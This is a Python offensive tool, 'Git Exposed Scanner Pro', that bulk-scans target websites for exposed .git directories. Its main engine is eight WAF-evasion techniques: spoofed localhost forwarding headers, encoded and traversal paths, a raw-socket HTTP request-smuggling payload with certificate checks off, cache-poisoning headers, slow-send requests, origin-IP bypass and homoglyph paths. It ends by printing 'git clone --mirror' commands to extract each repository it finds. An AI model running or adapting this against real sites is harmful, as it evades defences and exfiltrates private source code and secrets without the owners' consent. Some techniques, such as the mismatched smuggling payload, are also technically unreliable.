#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║     GIT EXPOSED SCANNER PRO - Enterprise WAF Bypass Framework           ║
║     Version: 3.0 - Colorful Professional Edition                        ║
║     Author: Security Research Team                                      ║
║     Compatibility: Python 3.8+                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import requests
import argparse
import sys
import json
import time
import random
import hashlib
import base64
import urllib3
import socket
import ssl
import threading
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import re
import signal
import os
from collections import defaultdict

# ============================================
# COLORFUL OUTPUT MODULE - Professional Styling
# ============================================

class Colors:
    """Professional color scheme for terminal output"""
    # Basic colors
    BLACK = '\033[0;30m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'
    
    # Bold colors
    BOLD_BLACK = '\033[1;30m'
    BOLD_RED = '\033[1;31m'
    BOLD_GREEN = '\033[1;32m'
    BOLD_YELLOW = '\033[1;33m'
    BOLD_BLUE = '\033[1;34m'
    BOLD_PURPLE = '\033[1;35m'
    BOLD_CYAN = '\033[1;36m'
    BOLD_WHITE = '\033[1;37m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'
    
    # Styles
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    
    # Reset
    RESET = '\033[0m'
    
    @staticmethod
    def gradient_text(text: str, start_color: str, end_color: str) -> str:
        """Create gradient effect for text (simplified)"""
        return f"{start_color}{text}{Colors.RESET}"
    
    @staticmethod
    def status_icon(status: str) -> str:
        """Return status icons"""
        icons = {
            'success': f"{Colors.GREEN}✓{Colors.RESET}",
            'error': f"{Colors.RED}✗{Colors.RESET}",
            'warning': f"{Colors.YELLOW}⚠{Colors.RESET}",
            'info': f"{Colors.BLUE}ℹ{Colors.RESET}",
            'question': f"{Colors.CYAN}?{Colors.RESET}",
            'star': f"{Colors.BOLD_YELLOW}★{Colors.RESET}",
            'fire': f"{Colors.BOLD_RED}🔥{Colors.RESET}",
            'shield': f"{Colors.CYAN}🛡️{Colors.RESET}",
            'target': f"{Colors.BOLD_RED}🎯{Colors.RESET}",
            'lock': f"{Colors.YELLOW}🔒{Colors.RESET}",
            'unlock': f"{Colors.GREEN}🔓{Colors.RESET}",
            'rocket': f"{Colors.BOLD_CYAN}🚀{Colors.RESET}",
        }
        return icons.get(status, f"{Colors.WHITE}•{Colors.RESET}")

class ProgressBar:
    """Custom progress bar with color"""
    def __init__(self, total: int, prefix: str = '', suffix: str = '', length: int = 50):
        self.total = total
        self.prefix = prefix
        self.suffix = suffix
        self.length = length
        self.current = 0
        self.start_time = time.time()
        
    def update(self, current: int = None):
        """Update progress bar"""
        if current:
            self.current = current
        else:
            self.current += 1
            
        percent = 100 * (self.current / float(self.total))
        filled_length = int(self.length * self.current // self.total)
        bar = f"{Colors.CYAN}█{Colors.RESET}" * filled_length + f"{Colors.DIM}─{Colors.RESET}" * (self.length - filled_length)
        
        # Calculate ETA
        elapsed = time.time() - self.start_time
        if self.current > 0:
            eta = (elapsed / self.current) * (self.total - self.current)
            eta_str = f"ETA: {eta:.1f}s"
        else:
            eta_str = "ETA: ---"
        
        sys.stdout.write(f'\r{self.prefix} |{bar}| {percent:.1f}% {self.current}/{self.total} {eta_str} {self.suffix}')
        sys.stdout.flush()
        
    def finish(self):
        """Complete progress bar"""
        print()

class TableFormatter:
    """Professional table formatter"""
    @staticmethod
    def print_table(headers: List[str], data: List[List[str]], title: str = None):
        """Print formatted table"""
        if title:
            print(f"\n{Colors.BOLD_CYAN}{'='*80}{Colors.RESET}")
            print(f"{Colors.BOLD_WHITE}{title.center(80)}{Colors.RESET}")
            print(f"{Colors.BOLD_CYAN}{'='*80}{Colors.RESET}")
        
        # Calculate column widths
        col_widths = [len(h) for h in headers]
        for row in data:
            for i, cell in enumerate(row):
                col_widths[i] = max(col_widths[i], len(str(cell)))
        
        # Print headers
        header_line = "│ "
        separator_line = "├─"
        for i, header in enumerate(headers):
            header_line += f"{Colors.BOLD_YELLOW}{header:<{col_widths[i]}}{Colors.RESET} │ "
            separator_line += "─" * col_widths[i] + "─┼─"
        separator_line = separator_line[:-2] + "┘"
        
        print(f"┌─{'─' * (sum(col_widths) + len(headers) * 3 - 1)}┐")
        print(header_line[:-2] + "│")
        print(separator_line)
        
        # Print rows
        for row in data:
            row_line = "│ "
            for i, cell in enumerate(row):
                # Color based on content
                if "EXPOSED" in str(cell) or "✅" in str(cell):
                    cell_str = f"{Colors.BOLD_RED}{cell}{Colors.RESET}"
                elif "SAFE" in str(cell) or "❌" in str(cell):
                    cell_str = f"{Colors.GREEN}{cell}{Colors.RESET}"
                elif "WARNING" in str(cell):
                    cell_str = f"{Colors.BOLD_YELLOW}{cell}{Colors.RESET}"
                else:
                    cell_str = str(cell)
                row_line += f"{cell_str:<{col_widths[i]}} │ "
            print(row_line[:-2] + "│")
        
        print(f"└─{'─' * (sum(col_widths) + len(headers) * 3 - 1)}┘")

class Banner:
    """Professional ASCII art banners"""
    @staticmethod
    def show_welcome():
        """Display welcome banner"""
        banner = f"""
{Colors.BOLD_CYAN}╔══════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}                                                                      {Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}      {Colors.BOLD_RED}██████╗ ██╗████████╗    ███████╗██╗  ██╗██████╗  ██████╗ ███████╗██████╗ {Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}      {Colors.BOLD_RED}██╔════╝ ██║╚══██╔══╝    ██╔════╝╚██╗██╔╝██╔══██╗██╔═══██╗██╔════╝██╔══██╗{Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}      {Colors.BOLD_RED}██║  ███╗██║   ██║       █████╗   ╚███╔╝ ██████╔╝██║   ██║█████╗  ██████╔╝{Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}      {Colors.BOLD_RED}██║   ██║██║   ██║       ██╔══╝   ██╔██╗ ██╔═══╝ ██║   ██║██╔══╝  ██╔══██╗{Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}      {Colors.BOLD_RED}╚██████╔╝██║   ██║       ███████╗██╔╝ ██╗██║     ╚██████╔╝███████╗██║  ██║{Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}      {Colors.BOLD_RED} ╚═════╝ ╚═╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝{Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}                                                                      {Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}           {Colors.BOLD_WHITE}Advanced Git Exposed Scanner - Enterprise WAF Bypass{Colors.RESET}           {Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}║{Colors.RESET}                    {Colors.DIM}Version 3.0 | Professional Edition{Colors.RESET}                     {Colors.BOLD_CYAN}║{Colors.RESET}
{Colors.BOLD_CYAN}╚══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(banner)
        
    @staticmethod
    def show_stats(stats: Dict):
        """Display statistics"""
        print(f"\n{Colors.BOLD_CYAN}╔══════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET}                      {Colors.BOLD_WHITE}SCAN STATISTICS{Colors.RESET}                          {Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}╠══════════════════════════════════════════════════════════════════════════╣{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.YELLOW}📊 Total Targets:{Colors.RESET} {stats['total']:<56} {Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.GREEN}✓ Secured Targets:{Colors.RESET} {stats['secured']:<55} {Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.RED}🔴 Exposed Targets:{Colors.RESET} {stats['exposed']:<55} {Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.BLUE}🔧 WAF Bypassed:{Colors.RESET} {stats['bypassed']:<56} {Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.PURPLE}⚡ Success Rate:{Colors.RESET} {stats['success_rate']:.1f}%{' ' * (56 - len(str(stats['success_rate'])) - 2)}{Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}║{Colors.RESET} {Colors.CYAN}⏱️  Scan Duration:{Colors.RESET} {stats['duration']:.2f}s{' ' * (56 - len(f"{stats['duration']:.2f}s"))}{Colors.BOLD_CYAN}║{Colors.RESET}")
        print(f"{Colors.BOLD_CYAN}╚══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")

# ============================================
# CORE BYPASS TECHNIQUES ENGINE
# ============================================

class WAFBypassEngine:
    """Core bypass techniques engine"""
    
    @staticmethod
    def bypass_technique_1_header_rotation(url: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 1: Header rotation and obfuscation"""
        headers_list = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            },
            {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'X-Forwarded-For': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': 'localhost',
                'X-Remote-Addr': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
            },
            {
                'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'X-Forwarded-For': '8.8.8.8',
                'X-Host': 'localhost',
                'X-Original-URL': '/.git/HEAD',
            }
        ]
        
        for headers in headers_list:
            try:
                response = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
                if response.status_code in [200, 403] and WAFBypassEngine._is_git_content(response.text):
                    return response
            except:
                continue
        return None
    
    @staticmethod
    def bypass_technique_2_path_encoding(url: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 2: Path encoding and obfuscation"""
        encodings = [
            '/.git/HEAD',
            '/%2e%67%69%74/HEAD',
            '/.git%2fHEAD',
            '/%2e%2e/%2e%2e/.git/HEAD',
            '/.../.git/HEAD',
            '/.git/HEAD/..;/',
            '/.git/HEAD?param=value',
            '/.git/HEAD#fragment',
            '/%2e%2e%2f%2e%2e%2f.git/HEAD',
            '/.GIT/HEAD',
            '/.%2567%2569%2574/HEAD',
        ]
        
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for encoding in encodings:
            try:
                test_url = f"{base}{encoding}"
                response = requests.get(test_url, timeout=timeout, verify=False, allow_redirects=False)
                if response.status_code in [200, 403] and WAFBypassEngine._is_git_content(response.text):
                    return response
            except:
                continue
        return None
    
    @staticmethod
    def bypass_technique_3_protocol_smuggling(host: str, port: int, path: str = '/.git/HEAD') -> Optional[str]:
        """Technique 3: Protocol smuggling via raw sockets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # HTTP request smuggling payload
            payload = f"""POST / HTTP/1.1
Host: {host}
Content-Length: 50
Transfer-Encoding: chunked

0

GET {path} HTTP/1.1
X-Ignore: 

"""
            sock.send(payload.encode())
            response = sock.recv(4096).decode()
            sock.close()
            
            if 'ref: refs/heads/' in response or 'ref: refs/remotes/' in response:
                return response
        except:
            pass
        return None
    
    @staticmethod
    def bypass_technique_4_cache_poisoning(url: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 4: Cache poisoning and deception"""
        cache_headers = [
            {'X-Forwarded-Host': 'localhost', 'X-Original-URL': '/.git/HEAD'},
            {'X-Rewrite-URL': '/.git/HEAD', 'X-HTTP-Method-Override': 'GET'},
            {'X-Forwarded-Scheme': 'http', 'X-Forwarded-Port': '80'},
            {'X-Real-IP': '127.0.0.1', 'X-Proxy-IP': '127.0.0.1'},
        ]
        
        for headers in cache_headers:
            try:
                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
                if response.status_code == 200 and WAFBypassEngine._is_git_content(response.text):
                    return response
            except:
                continue
        return None
    
    @staticmethod
    def bypass_technique_5_time_delay(url: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 5: Time-based and slowloris bypass"""
        try:
            # Split request into multiple packets
            parsed = urlparse(url)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            port = 443 if parsed.scheme == 'https' else 80
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=parsed.netloc)
            
            sock.connect((parsed.netloc, port))
            
            # Send request character by character
            request = f"GET /.git/HEAD HTTP/1.1\r\nHost: {parsed.netloc}\r\n\r\n"
            for char in request:
                sock.send(char.encode())
                time.sleep(random.uniform(0.01, 0.03))
            
            response = sock.recv(4096).decode()
            sock.close()
            
            if 'ref: refs/heads/' in response:
                return response
        except:
            pass
        return None
    
    @staticmethod
    def bypass_technique_6_cdn_origin_bypass(domain: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 6: CDN origin bypass via alternative ports and IPs"""
        # Try to resolve origin IP
        try:
            import dns.resolver
            answers = dns.resolver.resolve(domain, 'A')
            origin_ips = [str(answer) for answer in answers]
            
            for origin_ip in origin_ips:
                for port in [80, 443, 8080, 8443, 8000]:
                    try:
                        url = f"https://{origin_ip}:{port}/.git/HEAD" if port == 443 else f"http://{origin_ip}:{port}/.git/HEAD"
                        response = requests.get(url, headers={'Host': domain}, timeout=timeout, verify=False)
                        if response.status_code == 200 and WAFBypassEngine._is_git_content(response.text):
                            return response
                    except:
                        continue
        except:
            pass
        return None
    
    @staticmethod
    def bypass_technique_7_case_variation(url: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 7: Case variation (Windows servers)"""
        case_variants = [
            '/.git/HEAD', '/.GIT/HEAD', '/.Git/HEAD', '/.giT/HEAD',
            '/.GIT/head', '/.git/Head', '/.GiT/HeAd', '/.GIT/HeAd'
        ]
        
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for variant in case_variants:
            try:
                test_url = f"{base}{variant}"
                response = requests.get(test_url, timeout=timeout, verify=False)
                if response.status_code == 200 and WAFBypassEngine._is_git_content(response.text):
                    return response
            except:
                continue
        return None
    
    @staticmethod
    def bypass_technique_8_unicode_normalization(url: str, timeout: int = 10) -> Optional[requests.Response]:
        """Technique 8: Unicode and homoglyph attacks"""
        unicode_variants = [
            '/.git/HEAD',
            '/.gıt/HEAD',  # Turkish i
            '/.ǵit/HEAD',  # Accented g
            '/.ցit/HEAD',  # Armenian
            '/.git/НЕАD',  # Cyrillic
        ]
        
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for variant in unicode_variants:
            try:
                test_url = f"{base}{variant}"
                response = requests.get(test_url, timeout=timeout, verify=False)
                if response.status_code == 200 and WAFBypassEngine._is_git_content(response.text):
                    return response
            except:
                continue
        return None
    
    @staticmethod
    def _is_git_content(content: str) -> bool:
        """Core validation: Check if content is genuine Git data"""
        if not content:
            return False
        
        # Check for HTML/404 pages
        html_indicators = ['<html', '<!doctype', '404', 'not found', 'error']
        if any(indicator.lower() in content.lower() for indicator in html_indicators):
            return False
        
        # Check Git signatures
        git_signatures = [
            'ref: refs/heads/',
            'ref: refs/remotes/',
            '[core]',
            'repositoryformatversion',
            'commit',
            'tree ',
            'parent ',
            'author ',
            'committer ',
            'index ',
            'DIRC',
        ]
        
        return any(signature.lower() in content.lower() for signature in git_signatures)

# ============================================
# MAIN SCANNER ENGINE
# ============================================

class GitExposedScanner:
    """Main scanner engine with colorful output"""
    
    def __init__(self, timeout: int = 10, max_workers: int = 5, verbose: bool = False):
        self.timeout = timeout
        self.max_workers = max_workers
        self.verbose = verbose
        self.results = []
        self.bypass_engine = WAFBypassEngine()
        
        # Bypass techniques in order of effectiveness
        self.bypass_techniques = [
            ("Header Rotation", self.bypass_engine.bypass_technique_1_header_rotation),
            ("Path Encoding", self.bypass_engine.bypass_technique_2_path_encoding),
            ("Protocol Smuggling", self.bypass_engine.bypass_technique_3_protocol_smuggling),
            ("Cache Poisoning", self.bypass_engine.bypass_technique_4_cache_poisoning),
            ("Time Delay Attack", self.bypass_engine.bypass_technique_5_time_delay),
            ("CDN Origin Bypass", self.bypass_engine.bypass_technique_6_cdn_origin_bypass),
            ("Case Variation", self.bypass_engine.bypass_technique_7_case_variation),
            ("Unicode Attack", self.bypass_engine.bypass_technique_8_unicode_normalization),
        ]
    
    def scan_target(self, target: str) -> Dict:
        """Scan single target with all bypass techniques"""
        # Normalize URL
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        target = target.rstrip('/')
        
        print(f"\n{Colors.BOLD_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
        print(f"{Colors.status_icon('target')} {Colors.BOLD_WHITE}Target:{Colors.RESET} {target}")
        print(f"{Colors.status_icon('shield')} {Colors.BOLD_WHITE}Testing:{Colors.RESET} {len(self.bypass_techniques)} bypass techniques")
        print(f"{Colors.BOLD_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
        
        start_time = time.time()
        successful_technique = None
        response_data = None
        
        # Progress bar for techniques
        progress = ProgressBar(len(self.bypass_techniques), prefix='Progress', suffix='Complete', length=30)
        
        for idx, (tech_name, tech_func) in enumerate(self.bypass_techniques, 1):
            print(f"\n{Colors.DIM}[{idx}/{len(self.bypass_techniques)}] Testing: {tech_name}{Colors.RESET}", end=' ')
            
            try:
                if 'Protocol Smuggling' in tech_name:
                    # Protocol smuggling requires host and port
                    parsed = urlparse(target)
                    host = parsed.netloc.split(':')[0]
                    port = 443 if parsed.scheme == 'https' else 80
                    result = tech_func(host, port, '/.git/HEAD')
                    if result:
                        response_data = result
                        successful_technique = tech_name
                        print(f"{Colors.status_icon('success')} {Colors.BOLD_GREEN}SUCCESS!{Colors.RESET}")
                        break
                else:
                    # Standard techniques
                    test_url = f"{target}/.git/HEAD"
                    result = tech_func(test_url, self.timeout)
                    if result:
                        response_data = result
                        successful_technique = tech_name
                        print(f"{Colors.status_icon('success')} {Colors.BOLD_GREEN}SUCCESS!{Colors.RESET}")
                        break
                
                print(f"{Colors.status_icon('error')} {Colors.DIM}Failed{Colors.RESET}")
                
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.status_icon('error')} {Colors.DIM}Error: {str(e)[:50]}{Colors.RESET}")
                else:
                    print(f"{Colors.status_icon('error')} {Colors.DIM}Failed{Colors.RESET}")
            
            progress.update(idx)
        
        progress.finish()
        scan_duration = time.time() - start_time
        
        # Prepare result
        result = {
            'target': target,
            'exposed': successful_technique is not None,
            'technique': successful_technique,
            'duration': scan_duration,
            'timestamp': datetime.now().isoformat()
        }
        
        if successful_technique:
            result['response_preview'] = response_data[:200] if isinstance(response_data, str) else response_data.text[:200] if hasattr(response_data, 'text') else str(response_data)[:200]
            self._print_success_result(target, successful_technique, result['response_preview'])
        else:
            self._print_failure_result(target)
        
        self.results.append(result)
        return result
    
    def _print_success_result(self, target: str, technique: str, preview: str):
        """Print success result with styling"""
        print(f"""
{Colors.BOLD_RED}╔══════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD_RED}║{Colors.RESET}  {Colors.BOLD_WHITE}🔴 GIT REPOSITORY EXPOSED DETECTED!{Colors.RESET}                                      {Colors.BOLD_RED}║{Colors.RESET}
{Colors.BOLD_RED}╠══════════════════════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.BOLD_RED}║{Colors.RESET}  {Colors.YELLOW}📍 Target:{Colors.RESET} {target:<60} {Colors.BOLD_RED}║{Colors.RESET}
{Colors.BOLD_RED}║{Colors.RESET}  {Colors.YELLOW}🔧 Bypass Technique:{Colors.RESET} {technique:<58} {Colors.BOLD_RED}║{Colors.RESET}
{Colors.BOLD_RED}║{Colors.RESET}  {Colors.YELLOW}📄 Content Preview:{Colors.RESET}                                              {Colors.BOLD_RED}║{Colors.RESET}
{Colors.BOLD_RED}║{Colors.RESET}  {Colors.DIM}{preview[:60]}...{Colors.RESET}                                          {Colors.BOLD_RED}║{Colors.RESET}
{Colors.BOLD_RED}╚══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """)
    
    def _print_failure_result(self, target: str):
        """Print failure result with styling"""
        print(f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.GREEN}║{Colors.RESET}  {Colors.BOLD_GREEN}✅ Target is SECURE{Colors.RESET}                                                    {Colors.GREEN}║{Colors.RESET}
{Colors.GREEN}║{Colors.RESET}  {Colors.DIM}No exposed Git repositories found after all bypass attempts{Colors.RESET}                 {Colors.GREEN}║{Colors.RESET}
{Colors.GREEN}╚══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """)
    
    def scan_from_file(self, filepath: str) -> List[Dict]:
        """Scan multiple targets from file"""
        print(f"\n{Colors.BOLD_CYAN}[*] Loading targets from:{Colors.RESET} {filepath}")
        
        try:
            with open(filepath, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"{Colors.status_icon('error')} {Colors.BOLD_RED}Error reading file:{Colors.RESET} {e}")
            return []
        
        print(f"{Colors.status_icon('info')} {Colors.BOLD_WHITE}Loaded:{Colors.RESET} {len(targets)} targets")
        print(f"{Colors.status_icon('rocket')} {Colors.BOLD_WHITE}Starting scan with {self.max_workers} workers{Colors.RESET}\n")
        
        results = []
        start_time = time.time()
        
        # Progress bar for targets
        progress = ProgressBar(len(targets), prefix='Overall Progress', suffix='Complete', length=50)
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_target = {executor.submit(self.scan_target, target): target for target in targets}
            
            for idx, future in enumerate(as_completed(future_to_target), 1):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    target = future_to_target[future]
                    print(f"{Colors.status_icon('error')} Failed to scan {target}: {e}")
                progress.update(idx)
        
        progress.finish()
        scan_duration = time.time() - start_time
        
        # Display summary
        self._display_summary(results, scan_duration)
        
        return results
    
    def _display_summary(self, results: List[Dict], scan_duration: float):
        """Display scan summary with statistics"""
        exposed = [r for r in results if r['exposed']]
        
        stats = {
            'total': len(results),
            'secured': len(results) - len(exposed),
            'exposed': len(exposed),
            'bypassed': len(exposed),
            'success_rate': (len(exposed) / len(results)) * 100 if results else 0,
            'duration': scan_duration
        }
        
        Banner.show_stats(stats)
        
        if exposed:
            print(f"\n{Colors.BOLD_RED}🔴 EXPOSED REPOSITORIES:{Colors.RESET}")
            table_data = []
            for idx, exp in enumerate(exposed, 1):
                table_data.append([
                    f"{idx}",
                    exp['target'][:50],
                    exp['technique'][:30],
                    f"{exp['duration']:.2f}s"
                ])
            
            TableFormatter.print_table(
                ['#', 'Target', 'Bypass Technique', 'Duration'],
                table_data,
                '🚨 CRITICAL FINDINGS'
            )
            
            print(f"\n{Colors.BOLD_RED}⚠️  ACTION REQUIRED!{Colors.RESET}")
            print(f"{Colors.YELLOW}These {len(exposed)} targets have exposed Git repositories!{Colors.RESET}")
            print(f"{Colors.CYAN}To extract the repositories, run:{Colors.RESET}")
            for exp in exposed:
                print(f"  {Colors.DIM}git clone --mirror {exp['target']}/.git{Colors.RESET}")
        else:
            print(f"\n{Colors.BOLD_GREEN}🎉 EXCELLENT! No exposed Git repositories found!{Colors.RESET}")
            print(f"{Colors.GREEN}All targets are properly secured.{Colors.RESET}")

# ============================================
# MAIN EXECUTION
# ============================================

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print(f"\n\n{Colors.YELLOW}⚠️  Scan interrupted by user{Colors.RESET}")
    sys.exit(0)

def main():
    """Main entry point"""
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(
        description='Advanced Git Exposed Scanner - Professional WAF Bypass Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.BOLD_GREEN}EXAMPLES:{Colors.RESET}
  {Colors.CYAN}Single target scan:{Colors.RESET}
    python3 {sys.argv[0]} -t https://example.com
    
  {Colors.CYAN}Bulk scan from file:{Colors.RESET}
    python3 {sys.argv[0]} -l targets.txt
    
  {Colors.CYAN}With verbose output:{Colors.RESET}
    python3 {sys.argv[0]} -l targets.txt -v
    
  {Colors.CYAN}Save results to file:{Colors.RESET}
    python3 {sys.argv[0]} -l targets.txt -o results.json

{Colors.BOLD_YELLOW}INPUT FORMAT:{Colors.RESET}
  targets.txt can contain:
    https://example.com
    http://192.168.1.1
    example.org
    # This is a comment
        """
    )
    
    parser.add_argument('-t', '--target', help='Single target URL')
    parser.add_argument('-l', '--list', help='File containing list of targets')
    parser.add_argument('-o', '--output', help='Output JSON file for results')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--threads', type=int, default=5, help='Concurrent threads (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Clear screen and show banner
    os.system('clear' if os.name == 'posix' else 'cls')
    Banner.show_welcome()
    
    # Display configuration
    print(f"{Colors.BOLD_CYAN}⚙️  CONFIGURATION{Colors.RESET}")
    print(f"{Colors.DIM}{'─' * 80}{Colors.RESET}")
    print(f"{Colors.status_icon('info')} Timeout: {args.timeout}s")
    print(f"{Colors.status_icon('info')} Threads: {args.threads}")
    print(f"{Colors.status_icon('info')} Verbose: {'Yes' if args.verbose else 'No'}")
    print(f"{Colors.status_icon('shield')} Bypass Techniques: 8 advanced methods")
    print(f"{Colors.DIM}{'─' * 80}{Colors.RESET}")
    
    # Initialize scanner
    scanner = GitExposedScanner(
        timeout=args.timeout,
        max_workers=args.threads,
        verbose=args.verbose
    )
    
    # Run scan
    results = []
    if args.target:
        result = scanner.scan_target(args.target)
        results.append(result)
    elif args.list:
        results = scanner.scan_from_file(args.list)
    else:
        parser.print_help()
        sys.exit(1)
    
    # Save results if output specified
    if args.output and results:
        output_data = {
            'scan_timestamp': datetime.now().isoformat(),
            'total_targets': len(results),
            'exposed_count': sum(1 for r in results if r['exposed']),
            'results': results
        }
        
        with open(args.output, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        print(f"\n{Colors.status_icon('success')} {Colors.BOLD_GREEN}Results saved to:{Colors.RESET} {args.output}")
    
    print(f"\n{Colors.BOLD_CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.status_icon('rocket')} {Colors.BOLD_WHITE}Scan completed!{Colors.RESET}")
    print(f"{Colors.BOLD_CYAN}{'='*80}{Colors.RESET}\n")

if __name__ == "__main__":
    main()
